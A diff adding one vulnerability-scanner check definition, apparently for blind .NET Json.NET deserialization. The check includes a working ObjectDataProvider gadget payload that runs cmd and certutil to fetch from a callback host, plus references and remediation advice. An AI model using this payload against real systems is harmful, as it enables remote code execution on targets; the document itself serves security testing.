@@ -1,0 +1,20 @@
+{
+  "id": "m3-blind-deser-dotnet-jsonnet-odp",
+  "bug_class": "deserialization",
+  "title": ".NET insecure deserialization (Json.NET $type ObjectDataProvider)",
+  "severity": "Critical",
+  "applies_when": {
+    "category": "dotnet"
+  },
+  "insertion_kinds": [],
+  "oracle": {
+    "kind": "oob",
+    "payload_template": "{{\"$type\":\"System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35\",\"MethodName\":\"Start\",\"MethodParameters\":{{\"$type\":\"System.Collections.ArrayList, mscorlib\",\"$values\":[\"cmd\",\"/c certutil -urlcache -f http://{callback} x\"]}},\"ObjectInstance\":{{\"$type\":\"System.Diagnostics.Process, System\"}}}}"
+  },
+  "references": [
+    "CWE-502",
+    "CAPEC-586"
+  ],
+  "remediation": "Never deserialize untrusted data into arbitrary types. Use allowlist-based deserialization or a data-only format (JSON with a fixed schema), disable polymorphic type handling, and remove/patch the gadget libraries on the classpath. The inbound callback proves the gadget chain executed.",
+  "payload_family": "dotnet-jsonnet"
+}
